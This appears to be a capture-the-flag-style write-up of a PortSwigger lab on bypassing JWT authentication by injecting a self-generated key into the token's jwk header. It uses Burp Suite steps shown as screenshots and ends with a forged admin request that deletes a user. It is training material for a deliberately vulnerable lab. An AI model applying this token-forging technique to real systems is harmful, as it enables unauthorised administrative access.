# JWT Authentication Bypass — JWK Header Injection

This lab uses JWTs to manage sessions. The server honors the `jwk` parameter in a JWT's header — sometimes used to embed the verification key directly inside the token — but fails to confirm that the supplied key actually comes from a trusted source.

**Goal:** Modify and sign a JWT that grants access to the admin panel at `/admin`, then delete the user `carlos`.

Login credentials for your own account: wiener:peter

Tip: Getting comfortable with handling JWTs in Burp Suite beforehand is recommended.

---

**Reference:**
- https://portswigger.net/web-security/jwt

<img width="645" height="864" alt="1" src="https://github.com/user-attachments/assets/9710ff5b-542f-43d4-9825-14affd016649" />


---

Under "JWT Editor Keys," a new RSA key is generated:

<img width="576" height="562" alt="2" src="https://github.com/user-attachments/assets/a4e934c0-5371-4899-aae6-313e0a2f59a5" />


In Repeater's "JSON Web Token" tab, clicking "Attack" and then "Embedded JWK" applies the attack automatically:

<img width="446" height="809" alt="3" src="https://github.com/user-attachments/assets/e9a18880-e359-4f56-b3ec-518bd0c911d7" />


With that key embedded in the token, admin access is granted:

<img width="894" height="776" alt="4" src="https://github.com/user-attachments/assets/8ed1c49e-38f8-45a1-b7d0-c9abe1036c47" />


The target user can then be deleted:

```
GET /admin/delete?username=carlos HTTP/2
...
Cookie: session=eyJraWQiOiIzNmRiZGEzNi01NTJjLTQzOGItYWM0Yy05ZTM2NWZiNzhlYzUiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjM2ZGJkYTM2LTU1MmMtNDM4Yi1hYzRjLTllMzY1ZmI3OGVjNSIsIm4iOiJ6ZENkb2gxMjBYbnY5Q19VeXd4Slg3OGR0cU95TVM0MmNYZm1ualRZRXVTaGdNZDR5QUJRZVV1T2JpYmlrdXl0ZGFvcGRXMFB0WTFRMkFZT2cwSDZBNGlCYlR6UkhOYU44NUlPYjVKN21naUhIcDdvSWpEbFE2d2FqWnNyYWozVVM0aFgzVGRLM2djRUctaDBFV3BTaDlBMzR5ZnEzSENLTGRFVmJWMFhnUm1JM042TmNfVlg1YUljR2tvQUxIWkJkOWcxNzlDZkJ0dnRVdTNjRlBaQThlQzlpdjV4djFBeU80SWRsT1ZkS2pOZXJuUHU5NEx6enlZbEhPYkhIV2otQmFDNVB4NEowakR5bWRQYzlIYUxtNjdubEEwYXFaNktBNEh3elpIR0pFYjJVT18tWWExSENzUmhybnoyZTJRUlBWQU9IZ1FrUFdNS0piNnZPRlU1T1EifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTE3NTd9.LK85IOFXVB2lZE24KXson0NFXgtiNj4ZZNWsOs1tLij8JRa_AdrANyirsX36vSMooau-OlY-esVixuVbUbYYBWui6fO1Ep5mP4Z1rk2GvtRGuXuaCRj6ksFxnpcRj1yWAJ6xlHEzQAFSYBUDtrQTjfydKg9sx-RFhidoabqYkDVvtVG-NYhiVa4Sjfc0_4Nc98wna3PHKU-ompJReLji53YLqqrIMml9OGSzaUYZ5VLhlhoA2OT5zwOcnnYuXx23-cbsab7Jp5Oc5GDB_bQJU_LRTNFsIoII64aEDOz1AbMlXNX4czGGuQtkyR8HKc-owQ54rJoukIMyU-yGMmYz_g
...
```
